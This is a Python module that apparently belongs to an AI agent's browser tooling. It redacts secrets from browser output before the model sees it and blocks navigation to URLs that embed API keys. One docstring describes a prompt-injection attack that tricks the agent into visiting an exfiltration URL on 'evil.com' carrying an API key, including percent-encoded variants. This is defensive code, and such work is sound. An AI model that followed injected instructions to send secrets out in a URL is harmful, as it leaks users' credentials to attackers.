"""Shared security boundary for the browser tool family.

``browser_tool``, ``browser_cdp_tool``, and ``browser_camofox`` form one
model/network boundary but historically each carried its own copy of the
boundary checks, which drifted: the redaction walker was duplicated
byte-for-byte, the secret-in-URL exfil guard existed only on the
``browser_navigate`` path (missing from CDP ``Page.navigate`` and from
``camofox_navigate`` when called directly), and the CDP private guard was
hand-wired from five ``browser_tool`` underscore internals.

This module owns the checks that must be identical across the family.
SSRF primitives (``is_safe_url``, ``is_always_blocked_url``, sensitive
query params) stay in ``tools.url_safety`` — this module covers what that
one doesn't: model-bound output redaction and secret-exfil-in-URL.
"""
from __future__ import annotations

import urllib.parse
from typing import Any, Optional

SECRET_IN_URL_ERROR = (
    "Blocked: URL contains what appears to be an API key or token. "
    "Secrets must not be sent in URLs."
)


def redact_browser_output(value: Any) -> Any:
    """Redact secrets from browser-originated data before returning to the model.

    Browser snapshots, console messages, JS exceptions, eval results, and raw
    CDP responses can contain page-rendered API keys, cookies, bearer tokens,
    or pasted secrets. Tool output is a model boundary, so force redaction
    here even if global log redaction is disabled for debugging.
    """
    from agent.redact import redact_sensitive_text

    if isinstance(value, str):
        return redact_sensitive_text(value, force=True)
    if isinstance(value, list):
        return [redact_browser_output(item) for item in value]
    if isinstance(value, tuple):
        return tuple(redact_browser_output(item) for item in value)
    if isinstance(value, dict):
        return {key: redact_browser_output(item) for key, item in value.items()}
    return value


def secret_in_url_error(url: str) -> Optional[str]:
    """Return an error message when *url* embeds an API-key-shaped secret.

    A prompt injection can trick the agent into navigating to
    ``https://evil.com/steal?key=sk-ant-...`` to exfiltrate secrets — via any
    navigation surface, so every navigate-capable tool in the family must call
    this on its URL argument. Locality is no exemption: a local-only backend
    still sends the URL (and the secret) to the destination host.

    Checks the raw and URL-decoded forms to catch percent-encoding tricks
    (e.g. ``sk%2Dant%2D...``). Callers that normalize the URL before the
    request must re-check the normalized form (normalization can decode or
    re-map characters and surface a previously hidden match).
    """
    from agent.redact import _PREFIX_RE

    if _PREFIX_RE.search(url) or _PREFIX_RE.search(urllib.parse.unquote(url)):
        return SECRET_IN_URL_ERROR
    return None
